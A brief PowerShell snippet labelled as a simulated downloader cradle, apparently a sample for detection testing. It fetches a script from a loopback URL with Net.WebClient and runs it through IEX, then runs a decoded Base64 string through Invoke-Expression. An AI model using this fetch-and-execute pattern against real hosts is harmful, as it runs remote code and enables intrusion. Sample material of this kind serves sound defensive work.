# Simulated PowerShell downloader cradle
$u = "http://127.0.0.1/load.ps1"
IEX (New-Object Net.WebClient).DownloadString($u)
$x = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("JABhAD0A"))
Invoke-Expression $x
